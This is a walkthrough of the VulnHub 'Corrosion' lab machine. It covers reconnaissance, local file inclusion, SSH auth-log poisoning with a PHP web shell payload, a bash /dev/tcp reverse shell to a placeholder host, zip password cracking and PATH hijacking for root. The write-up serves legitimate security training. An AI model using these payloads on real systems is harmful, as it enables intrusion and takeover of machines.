# [Corrosion](https://www.vulnhub.com/entry/corrosion-1,730/)

## Initial Access

First as usual, `nmap`

```
# Nmap 7.92 scan initiated Fri Sep 10 11:39:04 2021 as: nmap -vvv -p 22,80 -sCV -oA init 192.168.56.101
Nmap scan report for 192.168.56.101
Host is up, received syn-ack (0.00024s latency).
Scanned at 2021-09-10 11:39:10 +07 for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Ubuntu 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 0c:a7:1c:8b:4e:85:6b:16:8c:fd:b7:cd:5f:60:3e:a4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC52yHwmrpdgwnwdcQWTWwcacaO5g8I7MDgB9oV/UxKEdqX1eJo8lJa6H2IWhsE9KvPuA8E6UoXyBSqDCQvV9okkr/KXuuG2Ezkf8l9wZlxN1ZIQvm3TeYjNGzVz7oZCHLiqYRi/Chp2kz6mezu+q8F0LpHyNZBids4ptXN/XKJYxTEOfm79HgFv9QqSjHAIwOHbsoyA4MmeynCO2A/ouWrrWhotdjqAfH2OyVzOcd9eKHjPLy0T8X+/P5PQllcyzxmMajsiWyQU2Wdp1t1BqTnbtNOVprZ3ZF1QjiCiJJjDoU1d8aQMpCktb6zXjwzU9yX+KmrYya0k7TSFcTZOnUdyoIS4/PwfufD2/bYtrsG7fYNO3TyJpDCXH/0bRXC1nabAZJtI8yyS4+Onmw79KD/OizdBQuax4nmG0MXHWw2+mPP7eRAbpGdVNwYTDZhzZ0WprkIJcH0/vF4CC2m8h1qewQ6YldKKMcIjIUI4GLkDoAaucVm+i4oFaMg3IYccIE=
|   256 0f:24:f4:65:af:50:d3:d3:aa:09:33:c3:17:3d:63:c7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKBXtCTWvPUcQRAcKqf9ZSCeToTh9IRG/7YIl0LN8bv1fkOlkY/P/nujWxQWY7TwLVLsbBajT4WpThh4O0Gs2P4=
|   256 b0:fa:cd:77:73:da:e4:7d:c8:75:a1:c5:5f:2c:21:0a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK5cFwfxj7kxGXwyXoUGxlppIgLvbCtV7clJfv5heUq2
80/tcp open  http    syn-ack Apache httpd 2.4.46 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.46 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 10 11:39:17 2021 -- 1 IP address (1 host up) scanned in 13.01 seconds
```

There's nothing on the web page on port 80 so we run `gobuster`.

```
/tasks                (Status: 200) [Size: 947]
/blog-post            (Status: 200) [Size: 190]
```

In `/tasks` is the file `tasks_todo.txt` with the following content.

```
# Tasks that need to be completed

1. Change permissions for auth log
2. Change port 22 -> 7672
3. Set up phpMyAdmin
```

The task of changing permissions for the auth log suggests possible log poisoning, which we note for later.

The page at `/blog-post` is just a static page with an image and a potential username "randy", so we run another `gobuster` on it.

```
/archives             (Status: 200) [Size: 984]
/uploads              (Status: 200) [Size: 190]
```

`/uploads` just gives us the landing page. `/archive` has the file `randylogs.php` which gives us a blank page so we fuzz its parameters. Since we previously found that we might have log poisoning, we look for file inclusion, which is a key step in log poisoning.

```
$ ffuf -u "http://192.168.56.101/blog-post/archives/randylogs.php?FUZZ=/etc/passwd" -w ~/tools/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 0

file                    [Status: 200, Size: 2832, Words: 38, Lines: 49, Duration: 6ms]
```

We have local file inclusion! Since the TODO tasks talked about the auth log, we GET `/var/log/auth.log`. To poison this log, we use the username in logging into SSH. For example, attempting to log in as "testing" without valid credentials gives us the following line in the log.

```
Sep 10 06:17:42 corrosion sshd[2429]: Failed password for invalid user testing from 192.168.56.1 port 35868 ssh2
Sep 10 06:17:43 corrosion sshd[2429]: Connection closed by invalid user testing 192.168.56.1 port 35868 [preauth]
```

We just need to give a PHP RCE payload in place of the username.

```sh
ssh '<?php system($_GET["cmd"]);?>@192.168.56.101'
```

To then get a reverse shell, make a request with `cmd` being the payload `bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1'`

```
192.168.56.101/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FYOUR_IP%2FPORT%200%3E%261%27
```

## Privilege Escalation to user randy

Looking around, we find that in `/var/backups` is the file `user_backup.zip`. This seems interesting so I download it to my local machine. Trying to unzip the file, we're met with a password prompt. We don't have a password so we crack it with john.

```sh
$ zip2john user_backup.zip > backup.john
$ john backup.john --wordlist=/path/to/rockyou.txt
```

With this, we have the password "!randybaby" and can unzip the archive. We should then have randy's `id_rsa` along with the password for it in `my_password.txt` and can now log into SSH as randy.

## Privilege Escalation to root

In the extracted archive is also `easysysinfo.c`. We can `find` it on the machine.

```sh
randy@corrosion:~$ find / -name easysysinfo 2>/dev/null
/home/randy/tools/easysysinfo
```

Looking at the code ...

```c
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("/usr/bin/date");

  system("cat /etc/hosts");

  system("/usr/bin/uname -a");

}
```

This sets UID & GID to root's and makes a few system calls, of which only `cat` doesn't use the full path. We can exploit this using PATH hijacking by creating a malicious executable named `cat`, putting it in our `PATH` and executing `easysysinfo`. To exploit, follow these steps.

```
randy@corrosion:/tmp$ echo "/bin/bash" > cat
randy@corrosion:/tmp$ chmod +x cat
randy@corrosion:/tmp$ export PATH=.:$PATH
randy@corrosion:/tmp$ /home/randy/tools/easysysinfo
```

With that, we should have a root shell.
